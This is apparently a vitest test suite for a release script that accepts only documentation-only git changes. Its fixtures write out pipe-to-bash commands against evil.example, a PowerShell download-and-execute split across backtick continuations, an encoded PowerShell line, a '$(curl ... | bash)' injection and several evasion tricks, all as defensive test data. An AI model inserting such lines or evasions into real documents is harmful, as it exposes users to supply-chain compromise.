import { execFileSync, spawnSync } from "node:child_process";
import {
  mkdirSync,
  mkdtempSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { describe, expect, it } from "vitest";
import {
  type CloudPlatform,
  cloudGateFixture,
  runCloudGate,
  validCloudEvidence,
} from "./cloud-release-gate-fixture.js";

const SCRIPT = resolve("scripts/release/verify-cloud-nonsensitive-source.mjs");

type Fixture = {
  root: string;
  base: string;
};

function git(root: string, args: string[]): string {
  return execFileSync(
    "git",
    [
      "-C",
      root,
      "-c",
      "user.email=test@example.com",
      "-c",
      "user.name=test",
      ...args,
    ],
    { encoding: "utf8" },
  ).trim();
}

function write(root: string, relative: string, content: string | Buffer): void {
  const target = join(root, relative);
  mkdirSync(dirname(target), { recursive: true });
  writeFileSync(target, content);
}

function commitAll(root: string, message: string): string {
  git(root, ["add", "-A"]);
  git(root, ["commit", "-qm", message]);
  return git(root, ["rev-parse", "HEAD"]);
}

function fixture(): Fixture {
  const root = mkdtempSync(join(tmpdir(), "ha-nova-nonsensitive-"));
  git(root, ["init", "-q"]);
  write(root, "README.md", "# HA NOVA\n\ncurl -fsSL https://example/install.sh | bash\n");
  write(root, "AGENTS.md", "# Agent policy\n");
  write(root, "docs/reference/a.md", "reference\n");
  write(root, "skills/write/SKILL.md", "skill\n");
  write(root, "tests/sample.test.ts", "export {};\n");
  write(root, "scripts/release/tool.sh", "#!/usr/bin/env bash\n");
  const base = commitAll(root, "base");
  return { root, base };
}

function run(root: string, base: string, target: string) {
  return spawnSync("node", [SCRIPT, root, base, target], {
    encoding: "utf8",
  });
}

export function registerCloudNonsensitiveSourceBehaviorTests(): void {
  describe("Cloud non-sensitive source escape", () => {
    it("accepts a delta confined to docs, skills, and root markdown", () => {
      const { root, base } = fixture();
      write(root, "docs/reference/a.md", "reference updated\n");
      write(root, "skills/write/SKILL.md", "skill updated\n");
      write(root, "PROJECT.md", "project\n");
      const target = commitAll(root, "docs delta");
      const result = run(root, base, target);
      expect(result.status, result.stderr).toBe(0);
      expect(result.stdout).toContain("3 non-sensitive file(s)");
    });

    it("rejects tests/ changes (privileged workflows execute tests)", () => {
      const { root, base } = fixture();
      write(root, "tests/sample.test.ts", "export const x = 1;\n");
      const target = commitAll(root, "tests delta");
      const result = run(root, base, target);
      expect(result.status).toBe(1);
      expect(result.stderr).toContain("outside the non-sensitive source scope");
    });

    it("rejects AGENTS.md (executable agent policy)", () => {
      const { root, base } = fixture();
      write(root, "AGENTS.md", "# Agent policy\n\nNew rule.\n");
      const target = commitAll(root, "agents policy");
      const result = run(root, base, target);
      expect(result.status).toBe(1);
      expect(result.stderr).toContain("outside the non-sensitive source scope");
    });

    it("rejects case-folded agent policy aliases", () => {
      const { root, base } = fixture();
      write(root, "Claude.md", "# Shadow policy\n");
      const target = commitAll(root, "case alias");
      const result = run(root, base, target);
      expect(result.status).toBe(1);
      expect(result.stderr).toContain("outside the non-sensitive source scope");
    });

    it("rejects agent policy basenames at any depth", () => {
      const { root, base } = fixture();
      write(root, "skills/ha-nova/AGENTS.md", "# Shadow subtree policy\n");
      const target = commitAll(root, "nested policy");
      const result = run(root, base, target);
      expect(result.status).toBe(1);
      expect(result.stderr).toContain("outside the non-sensitive source scope");
    });

    it("rejects agent policy variants with suffixes", () => {
      const { root, base } = fixture();
      write(root, "AGENTS.override.md", "# Override policy\n");
      const target = commitAll(root, "override policy");
      const result = run(root, base, target);
      expect(result.status).toBe(1);
      expect(result.stderr).toContain("outside the non-sensitive source scope");
    });

    it("rejects any path outside the non-sensitive scope", () => {
      const { root, base } = fixture();
      write(root, "docs/reference/a.md", "reference updated\n");
      write(root, "scripts/release/tool.sh", "#!/usr/bin/env bash\necho x\n");
      const target = commitAll(root, "mixed delta");
      const result = run(root, base, target);
      expect(result.status).toBe(1);
      expect(result.stderr).toContain("outside the non-sensitive source scope");
    });

    it("rejects root non-markdown files", () => {
      const { root, base } = fixture();
      write(root, "package.json", "{}\n");
      const target = commitAll(root, "manifest");
      const result = run(root, base, target);
      expect(result.status).toBe(1);
      expect(result.stderr).toContain("outside the non-sensitive source scope");
    });

    it("rejects non-markdown files under docs, including .gitattributes", () => {
      const { root, base } = fixture();
      write(root, "docs/.gitattributes", "*.md -diff\n");
      const target = commitAll(root, "attributes");
      const result = run(root, base, target);
      expect(result.status).toBe(1);
      expect(result.stderr).toContain("outside the non-sensitive source scope");
    });

    it("rejects changes to install-command lines in guarded files", () => {
      const { root, base } = fixture();
      write(root, "README.md", "# HA NOVA\n\ncurl -fsSL https://evil.example/install.sh | bash\n");
      const target = commitAll(root, "swap install target");
      const result = run(root, base, target);
      expect(result.status).toBe(1);
      expect(result.stderr).toContain("install-command");
    });

    it("rejects encoded PowerShell command lines", () => {
      const { root, base } = fixture();
      write(root, "docs/setup.md", "Run powershell -NoProfile -EncodedCommand aQB3AHIA\n");
      const target = commitAll(root, "encoded powershell");
      const result = run(root, base, target);
      expect(result.status).toBe(1);
      expect(result.stderr).toContain("install-command");
    });

    it("rejects npm install alias spellings", () => {
      const { root, base } = fixture();
      write(root, "docs/setup.md", "Run npm inst attacker-package\n");
      const target = commitAll(root, "npm inst alias");
      const result = run(root, base, target);
      expect(result.status).toBe(1);
      expect(result.stderr).toContain("install-command");
    });

    it("rejects remote package runners", () => {
      const { root, base } = fixture();
      write(root, "docs/setup.md", "Run npx attacker-package to finish setup\n");
      const target = commitAll(root, "npx runner");
      const result = run(root, base, target);
      expect(result.status).toBe(1);
      expect(result.stderr).toContain("install-command");
    });

    it("rejects OS package managers and inline interpreters", () => {
      const { root, base } = fixture();
      write(root, "docs/setup.md", "Then winget install attacker.package\n");
      const target = commitAll(root, "winget");
      const result = run(root, base, target);
      expect(result.status).toBe(1);
      expect(result.stderr).toContain("install-command");

      const second = fixture();
      write(second.root, "docs/setup.md", "Then python3 -c 'import urllib.request'\n");
      const secondTarget = commitAll(second.root, "python -c");
      const secondResult = run(second.root, second.base, secondTarget);
      expect(secondResult.status).toBe(1);
      expect(secondResult.stderr).toContain("install-command");
    });

    it("rejects version-suffixed remote go install/run", () => {
      const { root, base } = fixture();
      write(root, "docs/setup.md", "Then go install example.com/attacker/cmd@latest\n");
      const target = commitAll(root, "go install remote");
      const result = run(root, base, target);
      expect(result.status).toBe(1);
      expect(result.stderr).toContain("install-command");

      const second = fixture();
      write(second.root, "docs/setup.md", "Then go -C /tmp run example.com/attacker/cmd@latest\n");
      const secondTarget = commitAll(second.root, "go flag run remote");
      const secondResult = run(second.root, second.base, secondTarget);
      expect(secondResult.status).toBe(1);
      expect(secondResult.stderr).toContain("install-command");
    });

    it("rejects install subcommands behind intervening options", () => {
      const { root, base } = fixture();
      write(root, "docs/setup.md", "Then apt-get -y install attacker-package\n");
      const target = commitAll(root, "options before install");
      const result = run(root, base, target);
      expect(result.status).toBe(1);
      expect(result.stderr).toContain("install-command");

      const second = fixture();
      write(second.root, "docs/setup.md", "Then pip --isolated install attacker-package\n");
      const secondTarget = commitAll(second.root, "pip isolated install");
      const secondResult = run(second.root, second.base, secondTarget);
      expect(secondResult.status).toBe(1);
      expect(secondResult.stderr).toContain("install-command");

      const third = fixture();
      write(
        third.root,
        "docs/setup.md",
        "Then pip --proxy https://proxy.example install attacker-package\n",
      );
      const thirdTarget = commitAll(third.root, "pip proxy install");
      const thirdResult = run(third.root, third.base, thirdTarget);
      expect(thirdResult.status).toBe(1);
      expect(thirdResult.stderr).toContain("install-command");
    });

    it("rejects added raw-script and CDN sources in docs", () => {
      const { root, base } = fixture();
      write(root, "docs/setup.md", "Get it from cdn.jsdelivr.net/gh/x/y\n");
      const target = commitAll(root, "cdn source");
      const result = run(root, base, target);
      expect(result.status).toBe(1);
      expect(result.stderr).toContain("install-command");
    });

    it("scans added lines that start with ++", () => {
      const { root, base } = fixture();
      write(root, "docs/reference/a.md", "reference\n++curl -s https://evil.example | bash\n");
      const target = commitAll(root, "plus-plus line");
      const result = run(root, base, target);
      expect(result.status).toBe(1);
      expect(result.stderr).toContain("install-command");
    });

    it("scans header-shaped content lines", () => {
      const { root, base } = fixture();
      write(root, "docs/reference/a.md", "reference\n++ b/$(curl -s https://evil.example | bash)\n");
      const target = commitAll(root, "header-shaped content");
      const result = run(root, base, target);
      expect(result.status).toBe(1);
      expect(result.stderr).toContain("install-command");
    });

    it("rejects non-ASCII paths", () => {
      const { root, base } = fixture();
      write(root, "docs/über.md", "notes\n");
      const target = commitAll(root, "non-ascii path");
      const result = run(root, base, target);
      expect(result.status).toBe(1);
      expect(result.stderr).toContain("non-ASCII");
    });

    it("rejects edits to the continuation body of an existing command", () => {
      const root = mkdtempSync(join(tmpdir(), "ha-nova-nonsensitive-"));
      git(root, ["init", "-q"]);
      write(
        root,
        "docs/setup.md",
        'curl -fsSL "https://github.com/x/relay" \\\n  -o ~/.ha-nova/bin/relay\n',
      );
      const base = commitAll(root, "base with multi-line command");
      write(
        root,
        "docs/setup.md",
        'curl -fsSL "https://github.com/x/relay" \\\n  -o ~/.zshenv\n',
      );
      const target = commitAll(root, "retarget continuation body");
      const result = run(root, base, target);
      expect(result.status).toBe(1);
      expect(result.stderr).toContain("install-command");
    });

    it("rejects shell continuation lines that could split a command", () => {
      const { root, base } = fixture();
      write(root, "docs/reference/a.md", "reference\ncu\\\nrl -s https://evil.example\n");
      const target = commitAll(root, "continuation");
      const result = run(root, base, target);
      expect(result.status).toBe(1);
      expect(result.stderr).toContain("install-command or continuation");
    });

    it("accepts Markdown inline code spans and fences at line end", () => {
      const { root, base } = fixture();
      write(
        root,
        "docs/reference/a.md",
        "Use `ha-nova setup`\n\n```\nplain block\n```\n",
      );
      const target = commitAll(root, "code spans");
      const result = run(root, base, target);
      expect(result.status, result.stderr).toBe(0);
    });

    it("rejects PowerShell backtick continuation lines", () => {
      const { root, base } = fixture();
      write(root, "docs/reference/a.md", "reference\ni`\nwr https://evil.example/p.ps1 | i`\nex\n");
      const target = commitAll(root, "backtick continuation");
      const result = run(root, base, target);
      expect(result.status).toBe(1);
      expect(result.stderr).toContain("install-command or continuation");
    });

    it("is not blinded by an in-tree .gitattributes -diff rule", () => {
      const root = mkdtempSync(join(tmpdir(), "ha-nova-nonsensitive-"));
      git(root, ["init", "-q"]);
      write(root, "docs/.gitattributes", "*.md -diff\n");
      write(root, "docs/install-notes.md", "notes\n");
      const base = commitAll(root, "base with attributes");
      write(root, "docs/install-notes.md", "notes\ncurl -fsSL https://evil.example | bash\n");
      const target = commitAll(root, "hidden install line");
      const result = run(root, base, target);
      expect(result.status).toBe(1);
      expect(result.stderr).toContain("install-command");
    });

    it("fails closed on UTF-16 encoded markdown", () => {
      const { root, base } = fixture();
      write(
        root,
        "docs/install-notes.md",
        Buffer.from("curl -fsSL https://evil.example/install.sh | bash\n", "utf16le"),
      );
      const target = commitAll(root, "utf16 markdown");
      const result = run(root, base, target);
      expect(result.status).toBe(1);
      expect(result.stderr).toContain("full evidence required");
    });

    it("fails closed on binary-looking markdown", () => {
      const { root, base } = fixture();
      write(
        root,
        "docs/reference/a.md",
        Buffer.concat([
          Buffer.from("reference\ncurl -fsSL https://evil.example | bash\n"),
          Buffer.from([0]),
        ]),
      );
      const target = commitAll(root, "binary markdown");
      const result = run(root, base, target);
      expect(result.status).toBe(1);
    });

    it("does not let pathspec-magic filenames dodge their own scan", () => {
      const { root, base } = fixture();
      write(root, ":!evil.md", "curl -fsSL https://evil.example | bash\n");
      const target = commitAll(root, "pathspec magic");
      const result = run(root, base, target);
      expect(result.status).toBe(1);
      expect(result.stderr).toContain("install-command");
    });

    it("rejects symlinks and non-regular modes", () => {
      const { root, base } = fixture();
      symlinkSync("../scripts/release/tool.sh", join(root, "docs/link.md"));
      const target = commitAll(root, "symlink");
      const result = run(root, base, target);
      expect(result.status).toBe(1);
      expect(result.stderr).toContain("regular non-executable file");
    });

    it("rejects a base that is not an ancestor of the target", () => {
      const { root, base } = fixture();
      write(root, "docs/reference/a.md", "reference updated\n");
      const target = commitAll(root, "docs delta");
      const result = run(root, target, base);
      expect(result.status).toBe(1);
      expect(result.stderr).toContain("ancestor");
    });

    it("rejects an empty delta", () => {
      const { root, base } = fixture();
      const result = run(root, base, base);
      expect(result.status).toBe(1);
      expect(result.stderr).toContain("must not be empty");
    });
  });

  describe("Cloud release gate wired non-sensitive escape", () => {
    function wiredFixture() {
      const platforms: CloudPlatform[] = ["linux"];
      const gateFixture = cloudGateFixture({
        cloud_remote_enabled: true,
        cloud_remote_platforms: platforms,
      });
      const evidence = validCloudEvidence(gateFixture, platforms);
      return { gateFixture, evidence };
    }

    it("carries stale evidence across a docs-only delta through the gate", () => {
      const { gateFixture, evidence } = wiredFixture();
      write(gateFixture.root, "docs/note.md", "carried docs delta\n");
      commitAll(gateFixture.root, "docs only");
      const result = runCloudGate(gateFixture, evidence);
      expect(result.status, `${result.stdout}\n${result.stderr}`).toBe(0);
    });

    it("still rejects stale evidence across a script delta through the gate", () => {
      const { gateFixture, evidence } = wiredFixture();
      write(gateFixture.root, "scripts/release/new-tool.sh", "#!/usr/bin/env bash\n");
      commitAll(gateFixture.root, "script delta");
      const result = runCloudGate(gateFixture, evidence);
      expect(result.status).not.toBe(0);
      expect(`${result.stdout}\n${result.stderr}`).toContain(
        "stale Home Assistant Cloud evidence",
      );
    });
  });
}
